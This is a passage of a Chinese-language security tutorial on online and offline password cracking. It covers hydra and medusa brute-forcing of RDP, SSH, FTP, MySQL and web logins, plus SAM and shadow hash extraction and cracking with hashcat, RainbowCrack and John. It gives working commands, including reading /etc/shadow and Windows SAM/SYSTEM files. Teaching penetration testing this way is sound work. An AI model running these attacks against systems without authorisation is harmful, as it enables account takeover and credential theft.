+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P pass.lst rdp://1.1.1.1 -vVd -t 1</span><br><span class="line"></span><br><span class="line">-t：hydra因速度过快(默认并发连接数为16)，会导致被破解端响应不及时而破解失败。为提高破解成功率，使用此参数指定较小并发连接数。最大并发连接数64</span><br></pre></td></tr></table></figure>
+<h3 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h3><p>破解<code>Linux</code>中<code>ssh</code>服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P pass.lst ssh://1.1.1.1 -vV -e nsr -t 1</span><br><span class="line"></span><br><span class="line">-e nsr：n表示尝试空密码，s表示用户名密码相同，r表示密码为用户名倒置</span><br></pre></td></tr></table></figure>
+<h3 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a>其他服务密码破解</h3><p>支持的协议：<code>AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP</code>等类型密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64 -vV</span><br><span class="line"></span><br><span class="line">-s：指定非默认的服务端口</span><br><span class="line">-o：结果输出</span><br></pre></td></tr></table></figure>
+<h3 id="hydra图形化界面–xhydra"><a href="#hydra图形化界面–xhydra" class="headerlink" title="hydra图形化界面–xhydra"></a>hydra图形化界面–xhydra</h3><h3 id="hydra基于http表单的身份认证"><a href="#hydra基于http表单的身份认证" class="headerlink" title="hydra基于http表单的身份认证"></a>hydra基于http表单的身份认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass.lst 1.1.1.1 http-post-from &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:S=index.php&quot; -V</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-post-from：使用http post表单身份认证</span><br><span class="line"></span><br><span class="line">username与password为表单中输入框的名称</span><br><span class="line"></span><br><span class="line">^USER^与^PASS^表示此两处为使用字典中内容填充的位置</span><br><span class="line"></span><br><span class="line">根据post请求传输数据的具体格式来定义&quot;&quot;中的构造</span><br><span class="line"></span><br><span class="line">:S=index.php：此处:后应填写当登陆失败时返回的特征字符表示此次破解尝试失败，进行下次尝试。</span><br><span class="line">	此处应根据服务器对登陆post包的第一次响应包中的字符来确定特征字符，而非页面显示字符(应使用bp等抓包工具来确定)。应为login.php，非页面显示的login failed</span><br><span class="line">	DVWA中无论登陆成功或者失败，第一次响应包中都会包含login.php，所以hydra无论登陆成功与否都会认为登陆失败，进行下次尝试，所以此处应该换个思路</span><br><span class="line">	将失败的特征字符改为index.php，则可破解出密码。说明无论怎样，必须将特征字符准确的找出，才可能会破解成功。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P pass.lst 1.1.1.1 http-post-from &quot;/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H=X-Foo:Foo&quot; -V</span><br><span class="line"></span><br><span class="line">C：用于先访问指定的页面取得cookie，再使用此cookie进行密码破解</span><br><span class="line">H：指定http头，可设置多个H参数表示多个http头</span><br></pre></td></tr></table></figure>
+<p><code>hydra</code>同时也支持<code>http-get-form</code>(<code>get</code>请求)，<code>https-post-form</code>请求,<code>https-get-form</code>请求。使用<code>https</code>请求时需使用<code>-S</code>参数，使用<code>SSL</code>连接</p>
+<h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><h3 id="hydra的缺点"><a href="#hydra的缺点" class="headerlink" title="hydra的缺点"></a>hydra的缺点</h3><ol>
+<li><p>稳定性差，程序时常崩溃</p>
+</li>
+<li><p>速度控制不好，容易触发服务屏蔽或锁死机制</p>
+</li>
+<li><p>对每台主机新建进程，对每个服务新建实例，系统资源，存储消耗较大</p>
+</li>
+<li><p>大量目标时破解性能差</p>
+</li>
+</ol>
+<h3 id="medusa的特点"><a href="#medusa的特点" class="headerlink" title="medusa的特点"></a>medusa的特点</h3><ol>
+<li><p>稳定性好</p>
+</li>
+<li><p>速度控制得当</p>
+</li>
+<li><p>基于线程</p>
+</li>
+<li><p>支持模块少于<code>hydra</code>(不支持<code>rdp</code>)</p>
+</li>
+<li><p><code>web-form</code>支持存在缺陷</p>
+</li>
+</ol>
+<h3 id="Windows密码破解-1"><a href="#Windows密码破解-1" class="headerlink" title="Windows密码破解"></a>Windows密码破解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</span><br><span class="line"></span><br><span class="line">-d：查看medusa支持的模块</span><br><span class="line">-h：指定破解的目标</span><br><span class="line">-u：指定单个用户名</span><br><span class="line">-U：指定用户名文件</span><br><span class="line">-p：指定单个密码</span><br><span class="line">-P：指定密码文件</span><br><span class="line">-C：指定用户名密码文件(文件中用户名和密码在同一行，以分隔符分开)</span><br><span class="line">-e n/s/ns：n表示进行空密码尝试，s表示进行密码等于用户名尝试</span><br><span class="line">-M：指定使用的模块</span><br><span class="line">-F：首次破解成功即退出程序不再进行破解</span><br><span class="line">-n：指定非默认端口</span><br><span class="line">-s：使用SSL连接</span><br><span class="line">-T：指定并发主机数</span><br></pre></td></tr></table></figure>
+<h3 id="Linux密码破解-1"><a href="#Linux密码破解-1" class="headerlink" title="Linux密码破解"></a>Linux密码破解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M ssh -h 1.1.1.1 -e ns -F -u root -P pass.lst</span><br></pre></td></tr></table></figure>
+<h3 id="其他服务密码破解-1"><a href="#其他服务密码破解-1" class="headerlink" title="其他服务密码破解"></a>其他服务密码破解</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">cvs.mod：CVS会话的暴力模块：2.0版</span><br><span class="line"></span><br><span class="line">ftp.mod：FTP / FTPS会话的暴力模块：版本2.1</span><br><span class="line"></span><br><span class="line">http.mod：HTTP的蛮力模块：版本2.1</span><br><span class="line"></span><br><span class="line">imap.mod：用于IMAP会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">mssql.mod：M $ -SQL会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">mysql.mod：MySQL会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">nntp.mod：NNTP会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">pcanywhere.mod：PcAnywhere会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">pop3.mod：用于POP3会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">postgres.mod：PostgreSQL会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">rdp.mod：RDP（微软终端服务器）会话的蛮力模块：版本0.1</span><br><span class="line"></span><br><span class="line">rexec.mod：REXEC会话的蛮力模块：版本2.0</span><br><span class="line"></span><br><span class="line">rlogin.mod：RLOGIN会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">rsh.mod：RSH会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">smbnt.mod：SMB（LM / NTLM / LMv2 / NTLMv2）会话的强力模块：版本2.1</span><br><span class="line"></span><br><span class="line">smtp-vrfy.mod：用于验证SMTP帐户的蛮力模块（VRFY / EXPN / RCPT TO）：2.1版</span><br><span class="line"></span><br><span class="line">smtp.mod：用于TLS的SMTP身份验证的蛮力模块：版本2.0</span><br><span class="line"></span><br><span class="line">snmp.mod：SNMP Community Strings的暴力模块：版本2.1</span><br><span class="line"></span><br><span class="line">ssh.mod：用于SSH v2会话的强力模块：版本2.1</span><br><span class="line"></span><br><span class="line">svn.mod：Subversion会话的蛮力模块：版本2.1</span><br><span class="line"></span><br><span class="line">telnet.mod：用于telnet会话的暴力模块：版本2.0</span><br><span class="line"></span><br><span class="line">vmauthd.mod：VMware认证守护进程的蛮力模块：版本2.0</span><br><span class="line"></span><br><span class="line">vnc.mod：用于VNC会话的暴力模块：版本2.1</span><br><span class="line"></span><br><span class="line">web-form.mod：用于Web表单的暴力模块：版本2.1</span><br><span class="line"></span><br><span class="line">wrapper.mod：通用包装模块：版本2.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F</span><br></pre></td></tr></table></figure>
+<h3 id="medusa基于http表单的身份认证"><a href="#medusa基于http表单的身份认证" class="headerlink" title="medusa基于http表单的身份认证"></a>medusa基于http表单的身份认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORM-DATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;</span><br><span class="line"></span><br><span class="line">-m：指定模块中的参数值，指定多个-m来指定多个参数</span><br><span class="line">FORM参数：设置请求的目标</span><br><span class="line">DENY-SIGNAL参数：破解失败时显示的特征字符。只可设置失败特征字符，不同于hydra只需找到成功与失败不同的特征字符即可</span><br><span class="line">FORM-DATA参数：请求的方式，输入框中的内容(username,password)</span><br></pre></td></tr></table></figure>
+<p>查看某个模块使用的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">medusa -M web-form -q</span><br></pre></td></tr></table></figure></p>
+<p><code>medusa</code>设计思想为当进行破解，发出请求时，服务器返回200，然后从响应包中寻找特征字符来判断是否破解成功。但是<code>DVWA</code>不论登陆成功或者失败都会返回302，所以<code>medusa</code>无法进行<code>DVWA</code>登陆破解。</p>
+<h2 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a>密码破解效率</h2><ol>
+<li><p>密码复杂度(字典命中率)</p>
+</li>
+<li><p>带宽、协议、服务器性能、客户端性能</p>
+</li>
+<li><p>锁定阈值</p>
+</li>
+<li><p>单位时间最大登陆请求次数</p>
+</li>
+</ol>
+<hr>
+<h1 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><ol>
+<li><p>禁止明文传输密码</p>
+</li>
+<li><p>每次认证使用<code>HASH</code>算法加密密码传输</p>
+</li>
+<li><p>服务器端用户数据库应加盐加密保存</p>
+</li>
+</ol>
+<h2 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h2><ol>
+<li><p>嗅探获取密码<code>HASH</code></p>
+</li>
+<li><p>利用漏洞登陆服务器并从用户数据库中获取密码<code>HASH</code></p>
+</li>
+<li><p>识别<code>HASH</code>类型</p>
+<p> 长度、字符集</p>
+</li>
+<li><p>利用离线破解工具碰撞密码<code>HASH</code></p>
+</li>
+</ol>
+<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ol>
+<li><p>离线密码破解不会触发密码锁定机制</p>
+</li>
+<li><p>不会产生大量登陆失败日志引起目标管理员注意</p>
+</li>
+</ol>
+<h2 id="HASH类型识别工具"><a href="#HASH类型识别工具" class="headerlink" title="HASH类型识别工具"></a>HASH类型识别工具</h2><p>存在无法识别及识别错误的情况</p>
+<h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier</span><br></pre></td></tr></table></figure>
+<h3 id="hashid"><a href="#hashid" class="headerlink" title="hashid"></a>hashid</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashid HASH值</span><br></pre></td></tr></table></figure>
+<h2 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h2><ol>
+<li><p>利用漏洞：<code>pwdump</code>、<code>fgdump</code>、<code>mimikatz</code>、<code>wce</code></p>
+</li>
+<li><p>物理接触：<code>samdump2</code></p>
+</li>
+</ol>
+<h3 id="samdump2"><a href="#samdump2" class="headerlink" title="samdump2"></a>samdump2</h3><p>思路：</p>
+<ol>
+<li><p>在目标主机上使用<code>kali iso</code>安装光盘，进入<code>live</code>模式</p>
+</li>
+<li><p>挂载目标主机物理硬盘</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l	#查看目标主机的硬盘情况</span><br><span class="line">mount /dev/sda2 /mnt/	#挂载硬盘分区</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>寻找目标主机硬盘中的<code>SAM</code>数据库文件</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /mnt/Windows/System32/config</span><br></pre></td></tr></table></figure>
+<p> 在此目录下存在<code>SAM</code>文件与<code>SYSTEM</code>文件，<code>SAM</code>文件用于存放操作系统用户的<code>HASH</code>密码，<code>SYSTEM</code>文件用于存放对<code>SAM</code>文件加密的密钥。若<code>SYSTEM</code>文件中存在密钥，则开机时需要输入两次密码，第一次为验证<code>SYSTEM</code>文件，解锁<code>SAM</code>文件；第二次为验证<code>SAM</code>文件，登陆系统。</p>
+</li>
+<li><p>利用<code>samdump2</code>工具在<code>SAM</code>数据库文件中读取<code>HASH</code>值</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>拿<code>HASH</code>值做离线密码破解</p>
+</li>
+</ol>
+<h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><p>开源多线程密码破解工具</p>
+<p>支持80多种加密算法破解</p>
+<p>基于<code>CPU</code>的计算能力破解</p>
+<p>六种模式</p>
+<ol>
+<li><p>0 <code>Straight</code>:字典破解(默认)</p>
+</li>
+<li><p>1 <code>Combination</code>:将字典中密码进行组合(1 2 -&gt; 11 22 12 21)</p>
+</li>
+<li><p>2 <code>Toggle case</code>:尝试字典中所有密码的大小写字母组合</p>
+</li>
+<li><p>3 <code>Brute force</code>:指定字符集(或全部字符集)所有组合</p>
+</li>
+<li><p>4 <code>Permutayion</code>:字典中密码的全部字符置换组合(12-&gt;21)</p>
+</li>
+<li><p>5 <code>Table-lookup</code>:程序为字典中所有密码自动生成掩码</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 sam.hash pass.lst</span><br><span class="line"></span><br><span class="line">-m：指定hash算法id号</span><br><span class="line">sam.hash：存有hash值的文件</span><br><span class="line">pass.lst：密码字典</span><br><span class="line">-a：指定使用的模式</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-b：评估计算机CPU对不同的加密算法的破解能力</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?d?d</span><br><span class="line"></span><br><span class="line">?l=abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u=ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d=0123456789</span><br><span class="line">?s=!&quot;#$%&apos;()*+,-:;&lt;=&gt;?@[\]^_`&#123;|&#125;~</span><br><span class="line">?a=?l?u?d?s</span><br><span class="line">?b=0x00-0xff</span><br><span class="line"></span><br><span class="line">可以不指定密码字典，而使用特定的字符集进行破解</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hsahcat -m 100 -a 3 sam.hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l</span><br><span class="line"></span><br><span class="line">-i：密码长度增量模式</span><br><span class="line">--increment-min：最小密码长度</span><br><span class="line">--increment-max：最大密码长度</span><br></pre></td></tr></table></figure>
+<h2 id="bkhive"><a href="#bkhive" class="headerlink" title="bkhive"></a>bkhive</h2><h3 id="Windows中syskey加密工具"><a href="#Windows中syskey加密工具" class="headerlink" title="Windows中syskey加密工具"></a>Windows中syskey加密工具</h3><p><code>Windows7</code>对<code>SAM</code>文件进行加密：<code>win+R</code>–&gt;<code>syskey</code>–&gt;输入密码或存储到介质–&gt;完成</p>
+<p>此时重启<code>Windows7</code>系统，需先输入一次密码，之后才可以输入登陆密码</p>
+<p>此时<code>SAM</code>文件经过了再次加密，其中存储的<code>HASH</code>值已经不同于登陆密码的<code>HASH</code>值了，破解难度增大</p>
+<p>加密过程：</p>
+<ol>
+<li><p>使用<code>bootkey</code>利用<code>RC4</code>算法加密<code>SAM</code>数据库</p>
+</li>
+<li><p><code>bootkey</code>加密保存于<code>SYSTEM</code>文件中</p>
+</li>
+</ol>
+<h3 id="bkhive-1"><a href="#bkhive-1" class="headerlink" title="bkhive"></a>bkhive</h3><p>用于从<code>SYSTEM</code>文件中提取<code>bootkey</code></p>
+<p><code>kali2.0</code>已经抛弃<code>bkhive</code></p>
+<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><p>下载地址：<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf bkhive_1.1.1.orig.tar.gz</span><br><span class="line">cd bkhive-1.1.1/</span><br><span class="line">apt purge samdump2	#samdump2高版本与bkhive不兼容</span><br><span class="line">apt install libssl-dev</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<h4 id="破解流程"><a href="#破解流程" class="headerlink" title="破解流程"></a>破解流程</h4><ol>
+<li><p>将<code>SYSTEM</code>文件中的<code>bootkey</code>提取出来，存于<code>bkey</code></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkhive SYSTEM bkey</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>配合<code>samdump2</code>提取未经过<code>bootkey</code>加密的<code>HASH</code></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">samdump2 SAM bkey</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>无法实现，因<code>kali2.0</code>抛弃了<code>bkhive</code>，且<code>samdump2</code>高版本无法与<code>bkhive</code>兼容。建议使用<code>kali1.x</code>版本实现</p>
+<h2 id="oclhashcat"><a href="#oclhashcat" class="headerlink" title="oclhashcat"></a>oclhashcat</h2><p>号称世界上最快、唯一的基于<code>GPGPU</code>(通用图形处理器)的密码破解软件</p>
+<p>免费开源、支持多平台、支持分布式、支持150多种<code>HASH</code>算法</p>
+<p>硬件支持</p>
+<ol>
+<li><p>虚拟机中无法使用</p>
+</li>
+<li><p>支持<code>CUDA</code>技术的<code>Nvidia</code>显卡</p>
+</li>
+<li><p>支持<code>OpenCL</code>技术的<code>AMD</code>显卡</p>
+</li>
+</ol>
+<p>限制</p>
+<ol>
+<li><p>最大支持密码长度55个字符</p>
+</li>
+<li><p>使用<code>Unicode</code>编码的最大密码长度为27个字符</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">oclhashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line">oclhashcat命令格式类似于hashcat</span><br></pre></td></tr></table></figure>
+<h2 id="RainbowCrack-彩虹表"><a href="#RainbowCrack-彩虹表" class="headerlink" title="RainbowCrack(彩虹表)"></a>RainbowCrack(彩虹表)</h2><p>通常的<code>HASH</code>破解技术流程</p>
+<ol>
+<li><p>指定明文密码字典，指定要破解的<code>HASH</code>值</p>
+</li>
+<li><p>将明文密码进行与要破解的<code>HASH</code>值相同的加密方法进行加密</p>
+</li>
+<li><p>将两者进行比对，若相同，即可对应出明文密码；若不同，继续加密下一个明文密码进行比对，以此类推</p>
+</li>
+</ol>
+<p>基于时间记忆权衡技术生成彩虹表</p>
+<p>提前计算密码的<code>HASH</code>值，破解时直接进行比对<code>HASH</code>值来破解密码</p>
+<p><code>Kali</code>中包含的<code>RainbowCrack(彩虹表)</code>工具</p>
+<ol>
+<li><p><code>rtgen</code>：预计算，生成彩虹表，耗时的阶段</p>
+</li>
+<li><p><code>rtsort</code>：对<code>rtgen</code>生成的彩虹表进行排序</p>
+</li>
+<li><p><code>rcrack</code>：查找彩虹表进行密码破解</p>
+</li>
+</ol>
+<p>修改版<code>rtgen</code>支持<code>CUDA GPU</code>：<a href="http://www.freerainbowtables.com/en/download" target="_blank" rel="noopener">http://www.freerainbowtables.com/en/download</a></p>
+<p>彩虹表中一般包括：</p>
+<ol>
+<li><p>密码明文</p>
+</li>
+<li><p><code>HASH</code>值</p>
+</li>
+<li><p><code>HASH</code>算法</p>
+</li>
+<li><p>字符集类型</p>
+</li>
+<li><p>明文密码的长度范围</p>
+</li>
+</ol>
+<p>彩虹表下载</p>
+<p><a href="http://www.freerainbowtables.com/en/table/" target="_blank" rel="noopener">http://www.freerainbowtables.com/en/table/</a></p>
+<p><a href="http://rainbowtables.shmoo.com/" target="_blank" rel="noopener">http://rainbowtables.shmoo.com/</a></p>
+<h3 id="rtgen"><a href="#rtgen" class="headerlink" title="rtgen"></a>rtgen</h3><p>生成彩虹表</p>
+<p>支持的<code>HASH</code>加密算法：<code>lanman</code>,<code>NTLM</code>，<code>MD2</code>，<code>MD4</code>，<code>MD5</code>，<code>SHA1</code>，<code>SHA256`</code>RIPEMD160`</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rtgen md5 loweralpha 1 5 0 10000 10000 0</span><br><span class="line"></span><br><span class="line">-bench：评估计算机CPU生成彩虹表的能力</span><br><span class="line">rtgen HASH算法 字符集类型 明文密码最小长度 明文密码最大长度 表索引 表中链长 表中链数 链索引</span><br></pre></td></tr></table></figure>
+<p>生成的彩虹表(<code>.rt</code>文件)存放于<code>/usr/share/rainbowcrack</code>目录下</p>
+<h3 id="rtsort"><a href="#rtsort" class="headerlink" title="rtsort"></a>rtsort</h3><p>彩虹表排序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rtsort md5_loweralpha#1-5_0_1000x1000_0.rt</span><br></pre></td></tr></table></figure>
+<h3 id="rcrack"><a href="#rcrack" class="headerlink" title="rcrack"></a>rcrack</h3><p>查找彩虹表进行密码破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rcrack md5_loweralpha#1-5_0_1000x1000_0.rt -h HASH值</span><br><span class="line"></span><br><span class="line">rcrack md5_loweralpha#1-5_0_1000x1000_0.rt -l hash.txt</span><br></pre></td></tr></table></figure>
+<h2 id="John"><a href="#John" class="headerlink" title="John"></a>John</h2><p>基于<code>CPU</code>的密码破解工具</p>
+<p>支持众多加密算法的破解(支持某些对称加密算法的破解)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --list=formats</span><br></pre></td></tr></table></figure>
+<h3 id="模式："><a href="#模式：" class="headerlink" title="模式："></a>模式：</h3><ol>
+<li><p><code>wordlist</code>：基于规则的字典破解</p>
+</li>
+<li><p><code>single crack</code>：默认首先使用的模式，使用当前破解账号的<code>Login</code>/<code>GECOS</code>信息尝试破解密码</p>
+<p> <code>GECOS</code>信息：指<code>Linux</code>系统在创建账号时，要求用户填写的包括名字，电话，住址，爱好在内的个人信息，这些信息存储于<code>/etc/passwd</code>中。对于已经存在的账号，可使用<code>chfn</code>命令来添加修改账户个人信息</p>
+</li>
+<li><p><code>incremental</code>：所有或指定字符集的暴力破解</p>
+</li>
+<li><p><code>external</code>：需要在主配置文件中使用<code>C</code>语言编程来说明如何破解</p>
+</li>
+</ol>
+<h3 id="默认的破解模式"><a href="#默认的破解模式" class="headerlink" title="默认的破解模式"></a>默认的破解模式</h3><p>当不指定使用何种破解模式时，<code>John</code>会按照<code>single</code>–<code>wordlist</code>–<code>incremental</code>的顺序进行破解</p>
+<p>当不指定使用的密码字典时，<code>John</code>会使用主配置文件中指定的字典，<code>$JOHN/password.lst</code>即<code>/usr/share/john/password.lst</code></p>
+<h3 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a>破解Linux系统账号密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unshadow /etc/passwd /etc/shadow &gt; pass.txt #合并两个文件</span><br><span class="line">john pass.txt		#开始密码破解</span><br><span class="line">john --show pass.txt	#查看已经破解的密码</span><br></pre></td></tr></table></figure>
+<p>破解成功的密码存在于当前目录下的<code>.john/john.pot</code>文件中</p>
+<h3 id="破解Windows系统账号密码"><a href="#破解Windows系统账号密码" class="headerlink" title="破解Windows系统账号密码"></a>破解Windows系统账号密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john sam.hash --wordlist=password.lst --format=nt</span><br><span class="line"></span><br><span class="line">--format：指定要破解的hash类型</span><br></pre></td></tr></table></figure>
